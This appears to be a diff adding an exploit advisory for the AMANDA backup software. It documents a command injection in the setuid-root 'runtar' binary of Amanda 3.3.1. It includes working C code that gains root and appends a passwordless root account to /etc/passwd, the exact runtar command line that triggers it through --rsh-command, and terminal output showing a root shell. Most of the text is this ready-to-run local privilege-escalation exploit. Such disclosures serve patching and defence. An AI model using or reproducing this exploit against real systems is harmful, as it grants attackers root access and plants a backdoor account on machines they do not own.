@@ -1,0 +1,49 @@
+/*
+AMANDA, the Advanced Maryland Automatic Network Disk Archiver, is a backup 
+solution that allows the IT administrator to set up a single master backup
+server to back up multiple hosts over network to tape drives/changers or 
+disks or optical media. Amanda uses native utilities and formats (e.g. dump
+and/or GNU tar) and can back up a large number of servers and workstations
+running multiple versions of Linux or Unix. 
+
+A user with backup privs can trivially compromise a client installation.
+The "runtar" setuid root binary does not check for additional arguments
+supplied after --create, allowing users to manipulate commands and perform
+command injection as root. Tested against Amanda 3.3.1.
+
+An example is shown below:
+
+$ uname -a
+Linux raspberrypi 3.10.25 #1 Sat Dec 28 20:50:23 EST 2013 armv6l GNU/Linux
+$ ls -al /usr/lib/amanda/runtar
+-rwsr-xr-- 1 root backup 9776 Jul 29  2012 /usr/lib/amanda/runtar
+$ id
+uid=34(backup) gid=34(backup) groups=34(backup),6(disk),26(tape)
+$ cat /tmp/x.c
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(){
+        setreuid(0,0);
+        setregid(0,0);
+        system("echo r00t::0:0::/:/bin/sh >> /etc/passwd");
+        exit(0);
+}
+
+/*
+$ su - r00t
+No passwd entry for user 'r00t'
+$ gcc x.c -o x
+$ /usr/lib/amanda/runtar NOCONFIG tar --create --rsh-command=/tmp/x -vf localhost:/tmp/lol /etc/passwd
+tar: localhost\:/tmp/lol: Cannot open: Input/output error
+tar: Error is not recoverable: exiting now
+$ su - r00t
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+ -- Hacker Fantastic
+*/
